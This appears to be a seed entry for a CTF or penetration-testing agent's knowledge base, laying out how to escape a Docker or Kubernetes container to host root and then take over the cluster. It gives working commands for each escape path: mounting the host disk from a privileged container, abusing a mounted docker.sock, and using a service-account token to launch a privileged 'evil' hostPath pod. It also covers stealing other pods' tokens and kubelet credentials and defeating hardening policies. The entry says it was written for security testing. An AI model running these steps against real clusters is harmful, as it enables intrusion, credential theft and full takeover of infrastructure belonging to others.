# [Seed] Container Escape → Obtain Host Root (cap_sys_admin / privileged container / docker.sock)

## Scenario Classification
Penetration Testing / Cloud Native / Container Security

## Goal Overview
Obtain a shell inside a container (via an application vulnerability / exposed Jenkins / or RCE on K8s), then escape from the container to the host and move laterally to control the entire K8s cluster.

## Complete Execution Chain

1. Do reconnaissance immediately after entering the container.
   ```bash
   id                                    # are you root?
   cat /proc/self/status | grep CapEff   # check capabilities
   capsh --print                         # same as above, friendlier
   ls -la /var/run/docker.sock           # is the Docker socket mounted?
   mount | grep -v proc                  # see which host directories are mounted
   cat /proc/1/cgroup                    # is it docker / containerd / kubepods?
   env | grep -i 'kube\|docker\|aws\|az' # service account / metadata token
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. Choose an escape path based on the detection results:

   **Path A: Privileged container (`--privileged`)**
   ```bash
   # Directly mount the host disk
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # You are now host root
   ```

   **Path B: cap_sys_admin / cap_dac_read_search**
   ```bash
   # Bypass using release_agent (CVE-2022-0492 class)
   # Use cap_sys_admin to mount directly
   ```

   **Path C: docker.sock is mounted**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **Path D: K8s SA token has excessive permissions**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # If you can create a pod → use hostPID/hostNetwork/hostPath to launch a privileged pod and escape
   ```

   **Path E: kernel exploit (Dirty Pipe / Dirty COW / OverlayFS)**
   ```bash
   uname -a               # check the kernel version
   # Choose an existing exploit for the corresponding CVE
   ```

3. After escaping, find the next hop on the host.
   - kubelet credentials (/var/lib/kubelet)
   - container runtime socket (containerd / dockerd)
   - Other pods' tokens
   - hostNetwork → directly connect to all service IPs in the cluster
4. Spread laterally across the entire K8s cluster.

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| Container is non-root and capabilities are all empty | Application-layer hardening is good | Look for setuid binaries / kernel vulnerabilities / vulnerabilities outside the container | Several hours |
| docker.sock visible but unreadable | sock is root:root 660 | Add the current uid to the docker group (if a setgid program exists) or use another container | 30min |
| Privileged pod started but image pull fails | Internal cluster with an internal docker registry | Use an image already present in the cluster (pick any under kube-system) | 20min |
| K8s SA token has no permissions | The default SA is usually default/restricted | Try listing pods → find a pod with cluster-admin → steal its SA token | 1h |
| No common tools after chroot | Host is a minimal distribution | Mount /proc /dev /sys before chroot; or operate directly on /host from the original namespace | 30min |
| Cluster has PodSecurity Standards | The restricted policy disallows hostPath / privileged | Check whether any namespace has a lax admission configuration; find an SA with permission to create deployments | Several hours |

## Toolchain Findings

- **deepce** — automated container escape detection (a single sh script, no dependencies).
- **kdigger** — Kubernetes/container reconnaissance tool; outputs structured results.
- **peirates** — TUI dedicated to K8s penetration testing.
- **kube-hunter** by Aqua; scans cluster security issues.
- **botb (break out the box)** — veteran container escape tool.
- **cdk** — Swiss Army knife for container penetration testing (Chinese project; covers Chinese cloud provider scenarios).

## Key Code/Commands

One-command self-check:

```bash
# Fetch deepce (no dependencies)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# Output: N escape paths detected
```

Use a K8s SA token to launch a privileged pod and escape:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# If you can create a pod, use hostPath to mount the host
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# Then exec into the evil pod and chroot /host
```

CVE-2022-0492 exploitation (cap_sys_admin + no user namespace):

```bash
# See https://github.com/PaloAltoNetworks/cve-2022-0492
# Core: mount cgroup → write release_agent → trigger an empty cgroup → execute in the host context
```

## Suggestions for This Package

- `CTF-Sandbox-Orchestrator/competition-agent-cloud/` already exists; suggest adding `references/k8s-attack-paths.md`.
- Add a complete path example for "container escape → cluster takeover" to attack-chain.
- Add deepce / kdigger / peirates to the bootstrap manifest.

## Reusable Patterns/Script Snippets

**Container escape 5-path quick reference**:

```text
1. Privileged container      → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin             → CVE-2022-0492 (release_agent) / mount cgroup yourself
3. docker.sock               → docker run -v /:/host alpine chroot /host
4. K8s SA + permissions      → launch a hostPath/privileged pod
5. kernel CVE                → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Must-check after escaping**:

```text
- /var/lib/kubelet/pods/        → steal other pods' SA tokens
- /var/lib/docker/              → view the list of running containers
- ip addr                        → use hostNetwork to access service IPs directly
- crictl ps                      → containerd container list
- ps -ef --forest                → find kubelet / dockerd startup arguments (including tokens)
```

## Evolution Actions
- [ ] Add k8s-attack-paths.md to CTF-Sandbox-Orchestrator/competition-agent-cloud
- [ ] Add container escape → cluster takeover path to attack-chain
- [ ] Add deepce/kdigger/peirates to bootstrap-manifest

## Environment Information
- Attack position: inside the container (any shell entry point works)
- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: depends on the target; watch the time windows for CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386

## Anonymization Requirements
This entry is seed data, written based on public container/K8s security research, and does not involve any real cluster.
